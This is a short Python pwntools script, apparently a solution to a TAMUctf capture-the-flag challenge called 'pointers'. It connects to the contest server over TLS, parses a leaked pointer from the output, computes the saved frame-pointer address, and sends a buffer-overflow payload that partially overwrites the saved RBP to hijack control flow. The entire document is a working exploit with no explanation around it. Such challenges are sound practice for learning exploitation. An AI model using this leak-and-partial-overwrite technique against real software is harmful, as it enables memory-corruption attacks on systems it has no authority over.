from pwn import *

context.clear(arch="amd64")
p = remote("tamuctf.com", 443, ssl=True, sni="pointers")
# p = process('./pointers')

funcs_ptr = p.recvline().decode().split(" ")[-1][2:].strip()
saved_rbp = hex(int(funcs_ptr, 16) + 0x28)[2:]
payload = b'A' * 8 + p16(int(saved_rbp[-4:], 16))
p.clean(timeout=2)
p.sendline(payload)
print(p.clean(timeout=2).decode())
